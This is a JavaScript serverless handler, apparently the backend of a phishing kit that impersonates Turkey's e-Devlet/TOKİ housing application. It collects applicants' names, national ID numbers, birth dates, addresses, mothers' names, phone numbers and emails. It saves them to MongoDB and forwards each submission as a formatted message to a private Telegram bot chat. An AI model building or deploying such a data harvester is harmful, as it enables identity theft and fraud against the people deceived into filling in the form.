// api/save-application.js

const axios = require('axios');
const { MongoClient } = require('mongodb');

// Vercel ortam değişkenlerinden bilgileri okur
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const MONGODB_URI = process.env.MONGODB_URI;
const MONGODB_DB = process.env.MONGODB_DB || 'toki';

let cachedClient = null;

async function getClient(uri) {
    if (cachedClient) {
        try {
            await cachedClient.db('admin').command({ ping: 1 });
            return cachedClient;
        } catch (err) {
            cachedClient = null;
        }
    }
    
    const client = new MongoClient(uri, { 
        retryWrites: true, 
        w: 'majority',
        serverSelectionTimeoutMS: 5000
    });
    
    try {
        await client.connect();
    } catch (err) {
        console.error('[DB] MongoDB connection failed:', err.message);
        throw err;
    }
    cachedClient = client;
    return cachedClient;
}

function formatDate(date) {
    const d = new Date(date);
    const day = String(d.getDate()).padStart(2, '0');
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const year = d.getFullYear();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const seconds = String(d.getSeconds()).padStart(2, '0');
    return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
}

module.exports = async (req, res) => {
    // Sadece POST isteklerini işle
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    if (!BOT_TOKEN || !CHAT_ID) {
        return res.status(500).json({ success: false, message: 'Telegram configuration error.' });
    }

    if (!MONGODB_URI) {
        return res.status(500).json({ success: false, message: 'MongoDB configuration error.' });
    }

    try {
        const {
            name,
            tc,
            birth_date,
            city,
            district,
            mother_name,
            phone,
            email,
            project
        } = req.body;

        // Gerekli alanları kontrol et
        if (!name || !tc || !phone || !email || !project) {
            return res.status(400).json({ 
                success: false, 
                message: 'Eksik bilgi: name, tc, phone, email ve project zorunludur.' 
            });
        }

        let applicationId = null;
        
        // MongoDB'ye kaydet
        try {
            const client = await getClient(MONGODB_URI);
            const db = client.db(MONGODB_DB);
            const collection = db.collection('applications');
            
            const applicationData = {
                name: name,
                tc: tc,
                birth_date: birth_date || '',
                city: city || '',
                district: district || '',
                mother_name: mother_name || '',
                phone: phone,
                email: email,
                project: project,
                created_at: new Date()
            };
            
            const result = await collection.insertOne(applicationData);
            applicationId = result.insertedId.toString();
        } catch (dbError) {
            console.error('[DB] MongoDB save error:', dbError.message);
            // DB hatası olsa bile Telegram'a mesaj gönder
        }

        // Doğum tarihini formatla (dd.mm.yyyy)
        let formattedBirthDate = '';
        if (birth_date) {
            const parts = birth_date.split(/[\/\-]/);
            if (parts.length === 3) {
                formattedBirthDate = `${parts[0]}.${parts[1]}.${parts[2]}`;
            } else {
                formattedBirthDate = birth_date;
            }
        }

        // Telegram'a gönderilecek mesaj (yeni format)
        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n
*👤 Ad Soyad:* ${name}
*🆔 TC:* ${tc}
*📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
*🏙 Şehir:* ${city || 'Belirtilmemiş'}
*📍 İlçe/Adres:* ${district || 'Belirtilmemiş'}
*👩 Anne Adı:* ${mother_name || 'Belirtilmemiş'}
*🏠 Proje:* ${project}
*📱 Telefon:* ${phone}
*📧 E-posta:* ${email}
*🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}
*📅 Tarih:* ${formatDate(new Date())}`;

        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Telegram'a mesajı gönderme isteği
        await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown', // Markdown formatı için
        });

        // Başarılı yanıt
        return res.status(200).json({ 
            success: true, 
            message: 'Başvuru kaydedildi ve bildirim gönderildi.',
            application_id: applicationId
        });

    } catch (error) {
        console.error('Save Application Error:', error.message);
        return res.status(500).json({ 
            success: false, 
            message: 'Başvuru kaydedilemedi veya bildirim gönderilemedi.',
            error: error.message
        });
    }
};

